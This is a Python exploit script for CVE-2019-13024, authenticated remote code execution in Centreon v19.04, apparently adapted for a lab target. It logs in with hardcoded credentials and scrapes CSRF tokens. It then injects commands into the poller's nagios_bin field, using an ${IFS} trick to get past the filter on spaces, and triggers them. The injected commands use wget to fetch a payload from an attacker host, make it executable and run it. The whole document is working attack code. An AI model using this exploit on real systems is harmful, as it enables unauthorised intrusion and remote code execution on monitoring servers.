#!/usr/bin/python

'''
# Exploit Title: Centreon v19.04 authenticated Remote Code Execution
# Date: 28/06/2019
# Exploit Author: Askar (@mohammadaskar2)
# CVE : CVE-2019-13024
# Vendor Homepage: https://www.centreon.com/
# Software link: https://download.centreon.com
# Version: v19.04
# Tested on: CentOS 7.6 / PHP 5.4.16
'''

import requests
import sys
import warnings
import os
from bs4 import BeautifulSoup

# turn off BeautifulSoup warnings
warnings.filterwarnings("ignore", category=UserWarning, module='bs4')

# Config
LHOST = '10.10.14.23'
PAYLOAD_FILE = 'ls4444r'

target_url = 'http://10.10.10.157/centreon'
username = 'admin'
password = 'password1'
commands = ['wget http://'+LHOST+'/'+PAYLOAD_FILE+' -O '+PAYLOAD_FILE, 'chmod 755 '+PAYLOAD_FILE, './'+PAYLOAD_FILE]

request = requests.session()
print("[+] Retrieving CSRF token to submit the login form")
page = request.get(target_url+"/index.php")
html_content = page.text
soup = BeautifulSoup(html_content, features="lxml")
token = soup.findAll('input')[3].get("value")

login_info = {
    "useralias": username,
    "password": password,
    "submitLogin": "Connect",
    "centreon_token": token
}
login_request = request.post(target_url+"/index.php", login_info)
print("[+] Login token is : {0}".format(token))
if "Your credentials are incorrect." not in login_request.text:
    print("[+] Logged In Sucssfully")
    poller_configuration_page = target_url + "/main.get.php?p=60901"
    for cmd in commands:
        cmd = cmd.replace(' ', '${IFS%??}')
        print("[+] Retrieving Poller token")
        get_poller_token = request.get(poller_configuration_page)
        poller_html = get_poller_token.text
        poller_soup = BeautifulSoup(poller_html, features="lxml")
        poller_token = poller_soup.findAll('input')[24].get("value")
        print("[+] Poller token is : {0}".format(poller_token))

        payload_info = {
            "name": "Central",
            "ns_ip_address": "127.0.0.1",
            # this value should be 1 always
            "localhost[localhost]": "1",
            "is_default[is_default]": "0",
            "remote_id": "",
            "ssh_port": "22",
            "init_script": "centengine",
            # this value contains the payload , you can change it as you want
            "nagios_bin": cmd,
            "nagiostats_bin": "/usr/sbin/centenginestats",
            "nagios_perfdata": "/var/log/centreon-engine/service-perfdata",
            "centreonbroker_cfg_path": "/etc/centreon-broker",
            "centreonbroker_module_path": "/usr/share/centreon/lib/centreon-broker",
            "centreonbroker_logs_path": "",
            "centreonconnector_path": "/usr/lib64/centreon-connector",
            "init_script_centreontrapd": "centreontrapd",
            "snmp_trapd_path_conf": "/etc/snmp/centreon_traps/",
            "ns_activate[ns_activate]": "1",
            "submitC": "Save",
            "id": "1",
            "o": "c",
            "centreon_token": poller_token,
        }

        send_payload = request.post(poller_configuration_page, payload_info)
        print("[+] Injecting Done, triggering the payload")
        generate_xml_page = target_url + "/include/configuration/configGenerate/xml/generateFiles.php"
        xml_page_data = {
            "poller": "1",
            "debug": "true",
            "generate": "true",
        }
        out = request.post(generate_xml_page, xml_page_data)
        print(out.text)
